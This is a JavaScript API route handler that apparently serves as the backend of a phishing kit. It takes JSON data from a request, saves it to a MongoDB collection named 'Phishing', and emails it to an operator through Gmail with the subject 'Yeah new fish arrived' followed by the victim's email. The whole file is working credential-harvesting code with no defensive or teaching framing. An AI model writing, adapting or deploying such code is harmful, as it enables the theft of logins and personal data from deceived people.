import mongoose, { model, models } from 'mongoose';
import { placeholder } from '../../pages/api/placeholder/placeholder.js';
import dbConnect from '../../lib/dbConnect';
import { templateCreator } from '../../templates/html';

const nodemailer = require('nodemailer');

export default async function handler(req, res) {
  const { Schema } = mongoose;
  Promise = global.Promise;

  const DataSchema = new Schema(
    {
      dataPhish: {
        type: Object,
      },
    },
    {
      timestamps: true,
    }
  );

  await dbConnect();
  const Phishing = models.Phishing || model('Phishing', DataSchema);

  console.log(JSON.parse(req.query.params));
  const decodedString = JSON.parse(req.query.params);
  Phishing.create(
    {
      dataPhish: decodedString,
    },
    (err, dbResCreate) => {
      if (err || !dbResCreate) {
        console.log('Cannot send data => ', decodedString);
      } else {
        console.log('Data Successfully Stored');
      }
    }
  );
  var transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.SENDER_EMAIL || placeholder.SENDER_EMAIL,
      pass: process.env.SENDER_EMAIL_PASS || placeholder.SENDER_EMAIL_PASS,
    },
  });

  await new Promise((resolve, reject) => {
    // verify connection configuration
    transporter.verify(function (error, success) {
      if (error) {
        console.log(error);
        reject(error);
      } else {
        console.log('Server is ready to take our messages');
        resolve(success);
      }
    });
  });

  const mailData = {
    from: {
      name: process.env.SENDER_NAME || placeholder.SENDER_NAME,
      address: process.env.SENDER_EMAIL || placeholder.SENDER_EMAIL,
    },
    to: process.env.RECIEVER_EMAIL || placeholder.RECIEVER_EMAIL,
    subject: `Yeah new fish arrived${decodedString.mail}`,
    html: templateCreator(decodedString) || htmlIntegrated,
  };

  await new Promise((resolve, reject) => {
    // send mail
    transporter.sendMail(mailData, (err, info) => {
      if (err) {
        console.error(err);
        reject(err);
        res.status(504).end(JSON.stringify({ message: 'Successfully Registered' }));
      } else {
        console.log(info);
        resolve(info);
        res.status(200).end(JSON.stringify({ message: 'Successfully Registered' }));
      }
    });
  });
}
